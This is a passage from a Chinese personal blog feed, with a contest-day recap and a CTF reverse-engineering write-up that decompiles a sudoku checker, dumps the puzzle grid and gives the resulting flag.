src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/05/19/5ce03984b835c99805.jpg" alt="MVIMG_20190518_080614.jpg"></p><p>CCSP分区赛是第一次在川大举办的，看出来主办方对于应急事件的处理方法还不够了解，试机过程中状况百出</p><p>8:30上机调试，没有提供windows的IDE，仅仅有一个linux虚拟机，配上里面“丰富”的IDE，不过我并不觉得这是一个好办法，因为川大的电脑实在是太垃圾了。。虚拟机真的是带不动啊</p><p>幸好我带了U盘，装上了Dev-Cpp</p><p>经过无数次重启，好不容易进去了比赛界面</p><p>OJ是清华大学提供的，这个非常好</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/05/19/5ce039821f3f850433.jpg" alt="MVIMG_20190518_092009.jpg"></p><p>比赛期间还算进行得很顺利，不过嘛，菜是原罪</p><p>第一题是图论题，并不是什么高大上的题目，题目叙述非常简单，就是靠自己爆搜，剪枝吧</p><p>第二题模拟题，模拟raid5阵列恢复数据的过程</p><p>第三题是一道看不懂的与c++的类有关的题目，，，但是题目给的样例程序，交上去居然有分</p><p>中午12:30有午餐，是德克士的汉堡跟鸡腿，主办方在给选手提供良好比赛环境上还是下了很大功夫的</p><p>图片：颁奖现场</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/05/19/5ce039814c74597275.jpg" alt="MVIMG_20190518_153959.jpg"></p><blockquote><p>水了个铜奖</p></blockquote><p>奖励是罗技鼠标一个</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/05/19/5ce03982d7ed266471.jpg" alt="IMG_20190518_233712.jpg"></p><p>总结：这次川大之行非常愉快，一方面是见了见老同学聊了聊往事，另一方面我看到了川大在准备比赛上的用心和负责，虽然自己的水平还不够继续参加总决赛，不过这次区域赛无疑是一个很好的锻炼，期待以后的表现</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="牢骚" scheme="https://mrh1s.top/categories/%E7%89%A2%E9%AA%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>single</title>
    <link href="https://mrh1s.top/posts/caa72719/"/>
    <id>https://mrh1s.top/posts/caa72719/</id>
    <published>2019-05-14T05:44:02.000Z</published>
    <updated>2019-05-21T07:55:13.929Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="single"><a href="#single" class="headerlink" title="single"></a>single</h1><p><a href="\uploads\single.7z">single</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote><p> 经观察 发现a1是一个矩阵</p></blockquote><h3 id="sub-400833"><a href="#sub-400833" class="headerlink" title="sub_400833"></a>sub_400833</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400833</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">      ++s[*(<span class="keyword">unsigned</span> __int8 *)(<span class="number">9</span> * i + j + a1)];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">1</span>; k &lt;= <span class="number">9</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[k] != <span class="number">1</span> )</span><br><span class="line">        sub_4006F6();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将a1矩阵的<strong>每一行</strong>所指向的地址加1  最后s[1] - s[9] 全部等于1</p><p>​    </p><h3 id="sub-4008FE"><a href="#sub-4008FE" class="headerlink" title="sub_4008FE"></a>sub_4008FE</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4008FE</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">      ++s[*(<span class="keyword">unsigned</span> __int8 *)(<span class="number">9</span> * j + i + a1)];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">1</span>; k &lt;= <span class="number">9</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[k] != <span class="number">1</span> )</span><br><span class="line">        sub_4006F6();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    将a1矩阵的<strong>每一列</strong>所指向的地址加1  最后s[1] - s[9] 全部等于1</p><blockquote><p>其实做完这一步的时候我就反应出来这道题可能是一个数独了，并且验证最后一个函数的功能，发现确实是一个数独</p></blockquote><h3 id="sub-4009C9"><a href="#sub-4009C9" class="headerlink" title="sub_4009C9"></a>sub_4009C9</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4009C9</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> l; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  v7 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="keyword">for</span> ( j = v6 - <span class="number">3</span>; j &lt; v6; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = v7 - <span class="number">3</span>; k &lt; v7; ++k )</span><br><span class="line">        ++s[*(<span class="keyword">unsigned</span> __int8 *)(<span class="number">9</span> * j + k + a1)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">1</span>; l &lt;= <span class="number">9</span>; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[l] != <span class="number">1</span> )</span><br><span class="line">        sub_4006F6();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">3</span>;</span><br><span class="line">      v6 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    将a1矩阵分为<strong>九个正方形的小块</strong>  最后s[1] - s[9] 全部等于1</p><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><blockquote><p>程序先读入一个81位长的字符串</p><p>并且通过c -= ‘0’ 来转化为数字</p></blockquote><p>如果数独的某个位置上面已经有数的话，就必须输入0</p><h4 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = <span class="number">0x602080</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">81</span>):</span><br><span class="line">    <span class="keyword">print</span> Byte(addr+i),<span class="string">","</span>,</span><br><span class="line">    <span class="keyword">if</span>((i+<span class="number">1</span>) % <span class="number">9</span> == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">""</span></span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> , <span class="number">3</span> , <span class="number">0</span> , <span class="number">6</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , </span><br><span class="line"><span class="number">6</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">3</span> , <span class="number">2</span> , <span class="number">4</span> , <span class="number">9</span> , <span class="number">0</span> , </span><br><span class="line"><span class="number">0</span> , <span class="number">9</span> , <span class="number">0</span> , <span class="number">1</span> , <span class="number">0</span> , <span class="number">7</span> , <span class="number">0</span> , <span class="number">6</span> , <span class="number">0</span> , </span><br><span class="line"><span class="number">7</span> , <span class="number">4</span> , <span class="number">6</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , </span><br><span class="line"><span class="number">0</span> , <span class="number">1</span> , <span class="number">8</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">6</span> , <span class="number">3</span> , <span class="number">0</span> , </span><br><span class="line"><span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">1</span> , <span class="number">4</span> , <span class="number">7</span> , </span><br><span class="line"><span class="number">0</span> , <span class="number">8</span> , <span class="number">0</span> , <span class="number">9</span> , <span class="number">0</span> , <span class="number">4</span> , <span class="number">0</span> , <span class="number">7</span> , <span class="number">0</span> , </span><br><span class="line"><span class="number">0</span> , <span class="number">7</span> , <span class="number">4</span> , <span class="number">2</span> , <span class="number">1</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">6</span> , </span><br><span class="line"><span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , <span class="number">3</span> , <span class="number">0</span> , <span class="number">1</span> , <span class="number">0</span> ,</span><br></pre></td></tr></table></figure><h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><p><a href="http://www.llang.net/sudoku/calsudoku.html" target="_blank" rel="noopener">http://www.llang.net/sudoku/calsudoku.html</a> 求解即可</p><p>401095728057800001802040305000321589500479002923586000105060203300008950269750804</p><p>加个flag</p><blockquote><p>flag{401095728057800001802040305000321589500479002923586000105060203300008950269750804}</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
